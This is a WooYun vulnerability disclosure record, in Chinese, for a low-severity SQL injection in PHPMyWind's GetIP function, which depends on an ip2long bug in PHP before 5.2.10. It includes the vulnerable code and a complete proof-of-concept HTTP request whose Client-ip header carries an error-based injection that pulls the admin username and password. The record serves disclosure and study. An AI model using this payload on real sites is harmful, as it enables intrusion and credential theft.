{"id": 43876, "wybug_id": "wooyun-2014-081372", "wybug_title": "PHPMyWind一处注入（鸡肋）", "wybug_corp": "phpmywind.com", "wybug_author": "loopx9", "wybug_date": "2014-10-30 18:27", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-04：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： sql注射。 详细说明：  include\\common.func.php:\nfunction GetIP()\t{\t\tstatic $ip = NULL;\t\tif($ip !== NULL) return $ip;\t\t\tif(isset($_SERVER['HTTP_X_FORWARDED_FOR']))\t\t{\t\t\t$arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\t\t\t$pos = array_search('unknown',$arr);\t\t\tif(false !== $pos) unset($arr[$pos]);\t\t\t$ip  = trim($arr[0]);\t\t}\t\telse if(isset($_SERVER['HTTP_CLIENT_IP']))\t\t{\t\t\t$ip = $_SERVER['HTTP_CLIENT_IP'];\t\t}\t\telse if(isset($_SERVER['REMOTE_ADDR']))\t\t{\t\t\t$ip = $_SERVER['REMOTE_ADDR'];\t\t}\t\t\t//IP地址合法验证\t\t$ip = (false !== ip2long($ip)) ? $ip : '0.0.0.0';  //在低版本的php中ip2long有个bug，利用此bug可以绕过此处IP检查，进行sql注射\t\treturn $ip;\t}\n相关链接: http://www.securityfocus.com/archive/1/archive/1/441529/100/100/threaded2009年4月29日修复：http://git.php.net/?p=php-src.git;a=commit;h=1e09a216e4ed789b497a116140ae0a2a066f66ef影响范围： 针对php <5.2.10 的版本  （鸡肋原因）   漏洞证明：  数据包中在1.2.3.4后面跟一个TAB:\nPOST /PHPMyWind/vote.php?id=1 HTTP/1.1Host: localhostConnection: keep-aliveContent-Length: 35Content-Type: application/x-www-form-urlencodedClient-ip: 1.2.3.4\t' or  @`'` AND ( SELECT 1 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM pmw_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b) or @`'` and ''='options%5B%5D=1&voteid=1&action=add\n\n\n   修复方案：  过滤。   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-24 17:06 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  这么好的漏洞竟然没人关注    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}